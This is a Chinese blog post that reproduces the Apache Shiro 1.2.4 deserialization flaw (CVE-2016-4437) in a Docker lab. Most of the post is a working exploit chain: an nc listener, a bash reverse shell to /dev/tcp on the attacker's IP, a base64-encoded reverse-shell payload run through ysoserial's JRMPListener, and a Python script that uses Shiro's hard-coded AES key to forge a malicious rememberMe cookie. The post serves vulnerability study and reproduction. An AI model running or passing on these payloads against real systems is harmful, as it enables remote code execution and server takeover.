# Apache Shiro 1.2.4 反序列化漏洞（CVE-2016-4437）复现 - Panisme - 博客园

> 原文：[`www.cnblogs.com/panisme/p/12552838.html`](https://www.cnblogs.com/panisme/p/12552838.html)

影响版本：

Apache Shiro <= 1.2.4

原因分析：

Apache Shiro 默认使用了 CookieRememberMeManager，其处理 cookie 的流程是：得到 rememberMe 的 cookie 值 >  Base64 解码–>AES 解密–>反序列化。然而 AES 的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的 RCE 漏洞。

漏洞特征：

shiro 反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段

环境搭建：

安装 docker 环境，方法自行百度。

下载镜像

```
docker pull medicean/vulapps:s_shiro_1

```

直接运行镜像，将 docker 的 8080 端口映射到本地的 8080 上

```
docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1

```

 获取复现需要用到的 ysoserial 工具

 若无 mvn 则自行下载安装

```
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package -D skipTests

```

生成的工具在 target/目录下 ysoserial-0.0.6-SNAPSHOT-all.jar 文件

![](img/4f1662bf28ba42043e96b9fac2dcaa50.png)　

浏览器访问，出现以下页面则证明环境搭建成功。

http://目标 IP:8080

![](img/d2d238a8b4c40efdc5e34d923cc714e1.png)

漏洞利用，在攻击机上运行 nc 监听 1234 端口

```
nc -l -p 1234

```

反弹 shell 指令

```
bash -i >& /dev/tcp/攻击者 IP/1234 0>&1

```

将指令放到 http://www.jackson-t.ca/runtime-exec-payloads.html 转换成加密后的指令

![](img/f2d5b33afdbe65e8e846144ceca1a25e.png)

运行指令（通过 ysoserial 中的 JRMP 监听模块，监听 6666 端口并执行反弹 shell 命令）

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYxLjEzMy8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}'

```

 注：

payloads/JRMPClient 是结合 exploit/JRMPListener 使用的；
JRMPListener 是 ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server ，具体的利用过程是，将反序列化数据 发送到 Server 中，然后 Server 中进行反序列化操作，并开启指定端口，然后在通过 JRMPClient 去发送攻击 payload；
payloads/JRMPClient 生存的 payload 是发送给目标机器的，exploit/JRMPListener 是在自己服务器上使用的。

伪造 cookie 内容

```
python shiro.py 攻击者 IP:攻击者监听的 java 端口
```

![](img/aee2ea01adb3aed6470bff2642c026a2.png)

POC

```
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
print "rememberMe={0}".format(payload.decode())

```

前台登录，注意需要勾选 Remember Me ，截获数据包

![](img/6e46b346504ae04cec8bfcfaaeb1b02a.png)

 使用生成的 payload，替换请求中的 cookie 信息

![](img/6a812095c9558c8014c5f22fc0db674e.png)

查看 java 监听接口，nc 监听接口并成功执行相关命令。

![](img/dbdf89c4d920cce02e52bbc09e240224.png)

![](img/f4bb8fbe58c9bd6be69bc5147a225791.png)